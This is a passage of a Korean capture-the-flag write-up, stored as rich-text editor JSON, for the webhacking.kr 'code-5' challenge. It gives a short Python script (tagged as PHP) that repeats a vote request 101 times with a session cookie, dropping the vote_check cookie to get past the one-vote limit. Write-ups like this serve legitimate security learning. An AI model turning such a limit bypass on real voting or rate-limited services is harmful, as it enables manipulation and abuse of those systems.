          "alt": "",
          "title": null
        }
      },
      {
        "type": "paragraph",
        "content": [
          {
            "type": "text",
            "text": "hit가 100번까지 있으므로"
          }
        ]
      },
      {
        "type": "paragraph",
        "content": [
          {
            "type": "text",
            "text": "자기 이름으로 100번 넘게 hit를 요청하면 성공한다."
          }
        ]
      },
      {
        "type": "codeBlock",
        "attrs": {
          "language": "php"
        },
        "content": [
          {
            "type": "text",
            "text": "import requests\n\nurl = \"https://webhacking.kr/challenge/code-5/\"\nparams = {\"hit\": \"내_닉네임\"} # 본인의 닉네임 입력\ncookies = {\"PHPSESSID\": \"내_세션_ID\"} # 로그인 세션 ID\n\n# 100번 반복 투표 수행\nfor i in range(101):\n    # vote_check 쿠키를 제외하고 요청을 보냄\n    response = requests.get(url, params=params, cookies=cookies)\n    print(f\"{i}번째 투표 완료: {response.status_code}\")"
          }
        ]
      },
